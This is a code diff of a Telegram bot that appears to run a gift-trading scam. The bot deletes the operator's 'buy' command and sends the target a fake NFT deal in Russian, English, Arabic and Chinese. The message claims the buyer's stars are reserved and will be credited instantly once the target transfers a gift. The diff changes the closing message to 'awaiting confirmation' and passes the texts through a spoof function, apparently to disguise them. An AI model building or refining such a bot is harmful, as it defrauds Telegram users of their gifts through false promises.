@@ -71,28 +71,33 @@ TEXTS = {
         "btn_accept": "Принять", "btn_decline": "Отклонить",
         "declined_text": "Заказ <b>{order_id}</b>\n\n{cross} Вы отклонили предложение.",
         "deal_text": "<b>Сделка с NFT</b>\n\nЗаказ <b>{order_id}</b>\n\nПокупатель зарезервировал {amount} {star} средства защищены и\nбудут автоматически зачислены на ваш баланс сразу после\nпередачи подарка.\n\n<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {gift_name}\n2. Подтвердите передачу подарка.\n\nПлатформа зафиксирует сделку и моментально зачислит {amount} {star}\nна ваш баланс. Резерв действует 24 часа.",
-        "btn_give": "Передать подарок", "btn_confirm": "Подтвердить передачу"
+        "btn_give": "Передать подарок", "btn_confirm": "Подтвердить передачу",
+        # Новый текст после подтверждения
+        "confirmed_text": "{check} <b>Сделка завершена</b>\n\nОжидайте подтверждения передачи {amount} {star}."
     },
     "en": {
         "offer_text": "User offers you\n\n{amount} {star} for the gift {gift_link}.\n\nOffer valid for 5 h. 59 min.",
         "btn_accept": "Accept", "btn_decline": "Decline",
         "declined_text": "Order <b>{order_id}</b>\n\n{cross} You declined the offer.",
         "deal_text": "<b>NFT Deal</b>\n\nOrder <b>{order_id}</b>\n\nBuyer reserved {amount} {star} funds are protected and\nwill be automatically credited to your balance immediately after\nthe gift is transferred.\n\n<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {gift_name}\n2. Confirm the gift transfer.\n\nThe platform will record the deal and instantly credit {amount} {star}\nto your balance. The reserve is valid for 24 hours.",
-        "btn_give": "Give Gift", "btn_confirm": "Confirm Transfer"
+        "btn_give": "Give Gift", "btn_confirm": "Confirm Transfer",
+        "confirmed_text": "{check} <b>Deal completed</b>\n\nAwaiting confirmation of transfer of {amount} {star}."
     },
     "ar": {
         "offer_text": "المستخدم يعرض عليك\n\n{amount} {star} مقابل الهدية {gift_link}.\n\nالعرض صالح لمدة 5 ساعات و 59 دقيقة.",
         "btn_accept": "قبول", "btn_decline": "رفض",
         "declined_text": "طلب <b>{order_id}</b>\n\n{cross} لقد رفضت العرض.",
         "deal_text": "<b>صفقة NFT</b>\n\nطلب <b>{order_id}</b>\n\nاحتفظ المشتري بمبلغ {amount} {star} الأموال محمية وسيتم\nإضافتها تلقائيًا إلى رصيدك فور نقل الهدية.\n\n<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {gift_name}\n2. أكد نقل الهدية.\n\nستسجل المنصة الصفقة وتضيف {amount} {star}\nعلى الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
-        "btn_give": "تقديم الهدية", "btn_confirm": "تأكيد النقل"
+        "btn_give": "تقديم الهدية", "btn_confirm": "تأكيد النقل",
+        "confirmed_text": "{check} <b>تمت الصفقة</b>\n\nانتظر تأكيد نقل {amount} {star}."
     },
     "zh": {
         "offer_text": "用户向您报价\n\n{amount} {star} 购买礼物 {gift_link}。\n\n报价有效期为 5 小时 59 分钟。",
         "btn_accept": "接受", "btn_decline": "拒绝",
         "declined_text": "订单 <b>{order_id}</b>\n\n{cross} 您已拒绝该报价。",
         "deal_text": "<b>NFT 交易</b>\n\n订单 <b>{order_id}</b>\n\n买家已预留 {amount} {star} 资金已受保护，转移礼物后将自动记入您的余额。\n\n<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {gift_name}\n2. 确认礼物转移。\n\n平台将记录交易并立即将 {amount} {star} 记入您的余额。预留有效期为 24 小时。",
-        "btn_give": "赠送礼物", "btn_confirm": "确认转移"
+        "btn_give": "赠送礼物", "btn_confirm": "确认转移",
+        "confirmed_text": "{check} <b>交易完成</b>\n\n等待确认转移 {amount} {star}。"
     }
 }
 
@@ -172,11 +177,11 @@ async def handle_business_message(client, msg: dict):
     )
     body_spoofed = spoof(body, ratio=0.15)
 
-    # === 1. СРАЗУ УДАЛЯЕМ КОМАНДУ buy ===
+    # 1. СРАЗУ УДАЛЯЕМ КОМАНДУ buy
     await call(client, "deleteBusinessMessages",
                business_connection_id=bc_id, message_ids=[mid])
 
-    # === 2. ОТПРАВЛЯЕМ ОФФЕР ===
+    # 2. ОТПРАВЛЯЕМ ОФФЕР
     send_params = dict(
         business_connection_id=bc_id,
         chat_id=chat_id,
@@ -263,11 +268,23 @@ async def handle_confirm(client, cq: dict):
     st = state.get(key)
 
     if st:
-        new_text = "✅ <b>Сделка завершена!</b>\n\nСредства зачислены на ваш баланс."
+        t = TEXTS[st["lang"]]
+        cur = cur_html(st["cur"])
+        amount = html.escape(st["amount"])
+        
+        # Новый текст
+        new_text = t["confirmed_text"].format(
+            check=em(EMOJI_CHECK, "✅"),
+            amount=amount,
+            star=cur
+        )
+        new_text_spoofed = spoof(new_text, ratio=0.15)
+
         await call(client, "editMessageText",
                    business_connection_id=msg.get("business_connection_id") or st["bc"],
                    chat_id=chat_id, message_id=mid,
-                   text=new_text, parse_mode="HTML",
+                   text=new_text_spoofed, parse_mode="HTML",
+                   link_preview_options=preview(st["link"]),
                    reply_markup={"inline_keyboard": []})
         state.pop(key, None)
         save_state()
